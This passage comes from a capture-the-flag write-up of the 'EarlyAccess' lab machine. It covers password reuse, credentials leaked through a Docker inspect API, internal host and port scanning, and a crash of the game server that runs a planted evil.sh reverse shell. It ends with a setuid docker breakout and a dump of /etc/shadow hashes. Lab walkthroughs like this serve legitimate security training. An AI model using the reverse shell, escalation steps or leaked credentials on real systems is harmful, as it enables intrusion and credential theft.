Enumerating the box manually we find mysql creds `drew:drew` in `/var/www/html/.env`, however we can't do anything with them.

Looking in `/home/` we find user `www-adm` however no user.txt. As we have a few passwords, lets try a password re-use. 

```bash
www-data@webserver:/home/www-adm$ su www-adm
Password: 
www-adm@webserver:~$ id
uid=1000(www-adm) gid=1000(www-adm) groups=1000(www-adm)
```

Working credentials: __www-adm:gameover__

Looking in our home dir we find a new set of creds:
```bash
www-adm@webserver:~$ cat .wgetrc
user=api
password=s3CuR3_API_PW!
```

We could assume that we should connect to a API with the found creds, however we have yet to find a API during this challenge. Poking around we find that something responds when we call `api` on port 80. 

```bash
www-adm@webserver:~$ nc api.earlyaccess.htb 80
^CUnknown host
www-adm@webserver:~$ nc api 80                
api [172.18.0.101] 80 (http) : Connection refused
```

Do a port scan with netcat to find a active port.

```bash
www-adm@webserver:~$ nc -zv api 1-65500
DNS fwd/rev mismatch: api != api.app_nw
api [172.18.0.101] 5000 (?) open
```

```bash
www-adm@webserver:~$ curl api:5000
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}
www-adm@webserver:~$ curl api:"s3CuR3_API_PW!"@api:5000/check_db
{"message":{"AppArmorProfile":"docker-default","Args":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Config":{"AttachStderr":false,"AttachStdin":false,"AttachStdout":false,"Cmd":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Domainname":"","Entrypoint":["docker-entrypoint.sh"],"Env":["MYSQL_DATABASE=db","MYSQL_USER=drew","MYSQL_PASSWORD=drew","MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5","SERVICE_TAGS=dev","SERVICE_NAME=mysql","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.12","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.25-1debian10"],"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Healthcheck":{"Interval":5000000000,"Retries":3,"Test":["CMD-SHELL","mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent"],"Timeout":2000000000},"Hostname":"mysql","Image":"mysql:latest","Labels":{"com.docker.compose.config-hash":"947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"app","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/app","com.docker.compose.service":"mysql","com.docker.compose.version":"1.29.1"},"OnBuild":null,"OpenStdin":false,"StdinOnce":false,"Tty":true,"User":"","Volumes":{"/docker-entrypoint-initdb.d":{},"/var/lib/mysql":{}},"WorkingDir":""},"Created":"2021-09-16T13:38:13.822667973Z","Driver":"overlay2","ExecIDs":null,"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff","MergedDir":"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/merged","UpperDir":"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/diff","WorkDir":"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/work"},"Name":"overlay2"},"HostConfig":{"AutoRemove":false,"Binds":["/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro","app_vol_mysql:/var/lib/mysql:rw"],"BlkioDeviceReadBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceWriteIOps":null,"BlkioWeight":0,"BlkioWeightDevice":null,"CapAdd":["SYS_NICE"],"CapDrop":null,"Cgroup":"","CgroupParent":"","CgroupnsMode":"host","ConsoleSize":[0,0],"ContainerIDFile":"","CpuCount":0,"CpuPercent":0,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpuShares":0,"CpusetCpus":"","CpusetMems":"","DeviceCgroupRules":null,"DeviceRequests":null,"Devices":null,"Dns":null,"DnsOptions":null,"DnsSearch":null,"ExtraHosts":null,"GroupAdd":null,"IOMaximumBandwidth":0,"IOMaximumIOps":0,"IpcMode":"private","Isolation":"","KernelMemory":0,"KernelMemoryTCP":0,"Links":null,"LogConfig":{"Config":{},"Type":"json-file"},"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"Memory":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"NanoCpus":0,"NetworkMode":"app_nw","OomKillDisable":false,"OomScoreAdj":0,"PidMode":"","PidsLimit":null,"PortBindings":{},"Privileged":false,"PublishAllPorts":false,"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"],"ReadonlyRootfs":false,"RestartPolicy":{"MaximumRetryCount":0,"Name":"always"},"Runtime":"runc","SecurityOpt":null,"ShmSize":67108864,"UTSMode":"","Ulimits":null,"UsernsMode":"","VolumeDriver":"","VolumesFrom":[]},"HostnamePath":"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/hostname","HostsPath":"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/hosts","Id":"2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b","Image":"sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287","LogPath":"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b-json.log","MountLabel":"","Mounts":[{"Destination":"/docker-entrypoint-initdb.d","Mode":"ro","Propagation":"rprivate","RW":false,"Source":"/root/app/scripts/init.d","Type":"bind"},{"Destination":"/var/lib/mysql","Driver":"local","Mode":"rw","Name":"app_vol_mysql","Propagation":"","RW":true,"Source":"/var/lib/docker/volumes/app_vol_mysql/_data","Type":"volume"}],"Name":"/mysql","NetworkSettings":{"Bridge":"","EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"HairpinMode":false,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"MacAddress":"","Networks":{"app_nw":{"Aliases":["mysql","2a285912567e"],"DriverOpts":null,"EndpointID":"cdc013f43c805abdca5bfedb447532433c8e53038fabc3bb1c5ca751d81eb80e","Gateway":"172.18.0.1","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAMConfig":{"IPv4Address":"172.18.0.100"},"IPAddress":"172.18.0.100","IPPrefixLen":16,"IPv6Gateway":"","Links":null,"MacAddress":"02:42:ac:12:00:64","NetworkID":"cbb68a9f4bde079475a89a8c2948fb188abf9caa5d7ccb2c1c50844dc9935b3e"}},"Ports":{"3306/tcp":null,"33060/tcp":null},"SandboxID":"e9b084f4253b9d40bdd32b1c18ef6fddd03977dddcfbb8d3422bfef7d89d3e3c","SandboxKey":"/var/run/docker/netns/e9b084f4253b","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null},"Path":"docker-entrypoint.sh","Platform":"linux","ProcessLabel":"","ResolvConfPath":"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/resolv.conf","RestartCount":0,"State":{"Dead":false,"Error":"","ExitCode":0,"FinishedAt":"0001-01-01T00:00:00Z","Health":{"FailingStreak":0,"Log":[{"End":"2021-09-16T16:17:49.677779624+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-16T16:17:49.591002515+02:00"},{"End":"2021-09-16T16:17:54.762145333+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-16T16:17:54.681668413+02:00"},{"End":"2021-09-16T16:17:59.846907812+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-16T16:17:59.76533343+02:00"},{"End":"2021-09-16T16:18:04.934944592+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-16T16:18:04.849003146+02:00"},{"End":"2021-09-16T16:18:10.017393625+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-09-16T16:18:09.937871649+02:00"}],"Status":"healthy"},"OOMKilled":false,"Paused":false,"Pid":1097,"Restarting":false,"Running":true,"StartedAt":"2021-09-16T13:38:17.332306321Z","Status":"running"}},"status":200}
```

In the output we find SQL root creds - __`drew:XeoNu86JTznxMCQuGHrGutF3Csq5`__

Login with SSH and grab user.txt

```bash
┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ ssh drew@earlyaccess.htb
..
drew@earlyaccess:~$ id && hostname
uid=1000(drew) gid=1000(drew) groups=1000(drew)
earlyaccess

drew@earlyaccess:~$ cat user.txt 
b6ca7af4c496986e5632265206169ea4
```

---------------------------------

# ROOT

### Step 1

Enumerating manually (and with linpeas) we quickly find that `/opt/docker-entrypoint.d/` is owned by group `drew`, testing to add content in the directory reveals that it's auto cleaned frequently. 

```bash
drew@earlyaccess:~$ ./linpeas.sh 
..
..
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN         
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN   
tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN  
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN  
..
..
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group drew:
/opt/docker-entrypoint.d
```

Port 8443 is new to us, but we are unable to access it.
```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ curl -k https://127.0.0.1:8443
curl: (7) Failed to connect to 127.0.0.1 port 8443: Connection refused

Iptables rules:
*filter
-A INPUT -p tcp -m tcp --dport 8443 -j REJECT --reject-with tcp-reset
```

After some further enumeration we find a mail from game-adm in `/var/mail/drew`
>To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021
>
Hi Drew!
>
Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.
>
If you find any other problems, please don't hesitate to report them!
>
Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).

My guess here is that we should crash the game server, thus restarting the service and running scripts in `/opt/docker-entrypoint.d/` - where we will put our own `evil.sh` script.

---------------------------------

### Step 2

So we're looking for a game-server. We can assume it's in one of the three docker networks:
```bash
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:0e:38:a3:58 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cbb68a9f4bde: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:e3:e7:9c:c2 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cbb68a9f4bde
       valid_lft forever preferred_lft forever
5: br-34ef5fd49320: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:60:7b:7f:e1 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-34ef5fd49320
       valid_lft forever preferred_lft forever
```

The webserver that we have access to previously (User Step 7) was on 172.18.0.102 and the API 172.18.0.101, so probably everything related to web is on that subnet. Hopefully, all the other hosts are on 172.1X.__0__.XXX, we can do a ping sweep loop and try to find any hosts.
```bash
drew@earlyaccess:/var/mail$ for i in {2..254} ;do (ping -c 1 172.17.0.$i | grep "bytes from" &) ;done
drew@earlyaccess:/var/mail$ for i in {2..254} ;do (ping -c 1 172.18.0.$i | grep "bytes from" &) ;done
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.18.0.101: icmp_seq=1 ttl=64 time=0.108 ms
64 bytes from 172.18.0.100: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 172.18.0.102: icmp_seq=1 ttl=64 time=0.068 ms
drew@earlyaccess:/var/mail$ for i in {2..254} ;do (ping -c 1 172.19.0.$i | grep "bytes from" &) ;done
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.128 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.106 ms
```

Scan the hosts with nc to find open ports.
```bash
drew@earlyaccess:/var/mail$ nc -zvn 172.19.0.4 1-65500
drew@earlyaccess:/var/mail$ nc -zvn 172.19.0.2 1-65500
(UNKNOWN) [172.19.0.2] 9999 (?) open
(UNKNOWN) [172.19.0.2] 22 (ssh) open
drew@earlyaccess:/var/mail$ nc -zvn 172.18.0.100 1-65500
(UNKNOWN) [172.18.0.100] 33060 (?) open
(UNKNOWN) [172.18.0.100] 3306 (mysql) open
drew@earlyaccess:/var/mail$ nc -zvn 172.18.0.101 1-65500
(UNKNOWN) [172.18.0.101] 5000 (?) open
drew@earlyaccess:/var/mail$ nc -zvn 172.18.0.102 1-65500
(UNKNOWN) [172.18.0.102] 443 (https) open
(UNKNOWN) [172.18.0.102] 80 (http) open
```

172.19.0.2:9999 looks like it could be our game-server.

```html
drew@earlyaccess:/var/mail$ curl http://172.19.0.2:9999
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Rock v0.0.1</title>
    </head>
    <body>
        <div class="container">
            <div class="panel panel-default">
                <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
                    <div class="panel-body">
                        <div class="card header">
                            <div class="card-header">
                                Test-environment for Game-dev
                            </div>
                            <div>
                                <h2>Choose option</h2>
                                <div>
                                    <a href="/autoplay"><img src="x" alt="autoplay"</a>
                                    <a href="/rock"><img src="x" alt="rock"></a> 
                                    <a href="/paper"><img src="x" alt="paper"></a>
                                    <a href="/scissors"><img src="x" alt="scissors"></a>
                                </div>
                                <h3>Result of last game:</h3>
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```

---------------------------------

### Step 3
If we cURL the game-server and tries to make it autoplay, maybe we can start so many instances that it crashes.

```bash
drew@earlyaccess:/var/mail$ curl -v http://172.19.0.2:9999/autoplay
..
<div class="card-body">
	<form action="/autoplay" method="POST">
		<ul style="list-style-type: none">
			<li>
				<label for="rounds">Rounds:</label>
				<input type="number" placeholder="3" value="3" name="rounds" min="1" max="100">
				<button id="btn" class="btn btn-outline-dark center play-btn" onclick="">Start game</button>
			</li>
			<li>
				<label for="verbose">Verbose</label>
				<input type="checkbox" name="verbose" id="verbose" value="false">
			</li>
		</ul>
	</form>
</div>
```

```html
drew@earlyaccess:/dev/shm$ curl -X POST http://172.19.0.2:9999/autoplay -d "rounds=3&verbose=true"
<html><body><h1>Starting autoplay with 3 rounds</h1><p><h3>Playing round: 1</h3>
Outcome of round: loss</p>
<p><h3>Playing round: 2</h3>
Outcome of round: win</p>
<p><h3>Playing round: 3</h3>
Outcome of round: loss</p>
<h4>Stats:</h4><p>Wins: 1</p><p>Losses: 2</p><p>Ties: 0</p><a href="/autoplay">Go back</a></body></html>
```

Crash the application by entering a invalid (decimal) value. Upload our `evil.sh` reverse shell to `/etc/docker-entrypoint.d` and capture the incoming shell.

__Note:__ `/etc/docker-entrypoint.d` is cleared regularly, so keep re-creating `evil.sh` if it's removed before the game-server restarts.
```bash
drew@earlyaccess:/dev/shm$ curl -X POST http://172.19.0.2:9999/autoplay -d "rounds=99.999999999&verbose=true"
drew@earlyaccess:/opt/docker-entrypoint.d$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.5/4488 0>&1' > evil.sh && chmod +x evil.sh

┌──(void㉿void)-[/git/htb/earlyaccess]
└─$ nc -lvnp 4488                             
listening on [any] 4488 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.110] 42248
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@game-server:/usr/src/app# id && hostname
id && hostname
uid=0(root) gid=0(root) groups=0(root)
game-server
```

---------------------------------

### Step 4

We are in a unprivileged docker, unable to run docker-commands, capsh-commands or mounting directories. Looking in mount we can see that /dev/sda1 is already mounted to /docker-entrypoint.d

```bash
root@game-server:/docker-entrypoint.d# mount
..
/dev/sda1 on /docker-entrypoint.d type ext4 (rw,relatime,errors=remount-ro)
```

This means that we can moves files and/or scripts from the game-server, to the host machine. And since we are root on the docker/game-server, we are able to use 'SetUID' bit to make scripts execute like root on the host machine. 

```bash
root@game-server:/docker-entrypoint.d# cp /bin/bash . && chmod u+s bash
root@game-server:/docker-entrypoint.d# cp /bin/sh . && chmod u+s sh

drew@earlyaccess:/opt/docker-entrypoint.d$ ls -al
total 1204
drwxrwxr-t 2 root drew    4096 Sep 30 13:42 .
drwxr-xr-x 4 root root    4096 Jul 14 12:26 ..
-rwsr-xr-x 1 root root 1099016 Sep 30 13:42 bash
-rwsr-xr-x 1 root root  117208 Sep 30 13:42 sh

drew@earlyaccess:/opt/docker-entrypoint.d$ ./bash
./bash: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
drew@earlyaccess:/opt/docker-entrypoint.d$ ./sh
# id && hostname
uid=1000(drew) gid=1000(drew) euid=0(root) groups=1000(drew)
earlyaccess

# cat /root/root.txt
a3537b30eb1073d19779ae81448520ee

# cat /etc/shadow
root:$6$2QbMgoSoxCmfitM7$fivhckW6N0Qk8Y3.RDUy8iFKm/BcwEUkUDwKZa5s3LC6bhJuBwPxaqUpUJ76oOiI10i7CfcpPj1CcwVWsRLoz/:18871:0:99999:7:::
drew:$6$AADwRDsC1bSDK3pl$IixXS9pA.Gl3wLIkGCERTSE9tBeZtpRkw.gipzq9Z/MgKmh3mpgSG7TySc3EFyUfKH7B4VoJo3OtSPVwP627Q0:18771:0:99999:7:::
game-adm:$6$SlEudWDN76ied096$2sRRXzh/aT.0dlO6liqqNdHrrOoZHgJXf1c4dHsXByibZvSsYG3wy7vIQQnJpNpphZAGVYTp0Sf5QzHk1JA8a1:18822:0:99999:7:::

```


---------------------------------

# REFERENCES


Exploit LFI / RFI:
	https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md
	
NC Port scan:
	https://www.cyberciti.biz/faq/linux-port-scanning/
	
Ping Sweep Loop:
	https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/
	
Docker, Writable Folder:
	https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mount-writable-folder
